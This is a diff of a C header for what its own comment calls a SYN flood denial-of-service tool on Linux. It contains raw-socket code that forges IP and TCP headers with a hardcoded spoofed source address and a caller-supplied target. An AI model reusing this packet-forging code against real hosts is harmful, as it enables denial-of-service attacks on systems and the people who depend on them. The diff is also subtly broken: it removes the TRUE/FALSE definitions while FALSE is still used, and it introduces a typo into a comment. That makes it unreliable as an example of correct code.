@@ -1,8 +1,6 @@
 #ifndef __NETWORK_H___
 #define __NETWORK_H___
 
-#define __USE_MISC 1
-
 #include <features.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -12,6 +10,11 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <sys/types.h>
+#include <stdint.h>
+#include <rpc/types.h>
+
+#define __USE_MISC 1
+
 #include <sys/stat.h>
 #include <netinet/in.h>
 #include <linux/if_addr.h>
@@ -23,6 +26,7 @@
 #include <net/ethernet.h>
 #include <getopt.h>
 #include <pthread.h>
+#include <time.h>
 /*
 	Syn Flood DOS with LINUX sockets
 */
@@ -31,9 +35,6 @@
 #define ETH_HDRHLEN    14      // octets in entire header
 
 #define bool uint8_t
-
-#define TRUE 0x1
-#define FALSE 0x0
 
 struct eth_hdr {
     unsigned char   h_dest[ETH_ADDRLEN];       // Destination address
@@ -54,7 +55,7 @@ bool SendStringServer(int sockfd, char *buffer) {
             if(iSentBytes == -1)
                 return FALSE;
 
-        // Calculate new ptr and sub iBytesToSend
+        // Calculate new ptr and sub iBytesT oSend
         iBytesToSend -= iSentBytes;
         buffer += iSentBytes;
     }
@@ -159,6 +160,7 @@ __u_int DecodeTcp(const char *szBuffer) {
 
     printf("\n\n");
     
+    return 0;
 }
 
 struct pseudo_header    //needed for checksum calculation
@@ -188,7 +190,7 @@ unsigned short csum(unsigned short *ptr,int nbytes) {
 		sum+=oddbyte;
 	}
 
-	sum = (sum>>16)+(sum & 0xffff);
+	sum = (sum>>16) + (sum & 0xffff);
 	sum = sum + (sum>>16);
 	answer=(short)~sum;
 	
@@ -205,10 +207,10 @@ void CreateSockaddr(struct sockaddr_in *sin, int port_num,
 }
 
 void CreateArpHeader(struct iphdr *ip, unsigned int protocol,
-        in_addr_t destination) {
+        char *destination) {
     ip->ihl = 5;
     ip->version = 4;
-    ip->tos = 0;
+    ip->tos = 34;
     ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
     ip->id = htons(12345);
     ip->frag_off = 0;
@@ -216,7 +218,9 @@ void CreateArpHeader(struct iphdr *ip, unsigned int protocol,
     ip->protocol = protocol;
     ip->check = 0;
     ip->saddr = inet_addr("10.15.46.123");
-    ip->daddr = destination;
+    ip->daddr = 0;
+
+    inet_pton(AF_INET, destination, &ip->daddr);
 }
 
 void CreateTcpHeader(struct tcphdr *tcph, int port) {
@@ -230,7 +234,7 @@ void CreateTcpHeader(struct tcphdr *tcph, int port) {
 	tcph->rst=0;
 	tcph->psh=0;
 	tcph->ack=0;
-	tcph->urg=0;
+	tcph->urg=1;
 	tcph->window = htons (5840);	/* maximum allowed window size */
 	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
 				should fill in the correct checksum during transmission */
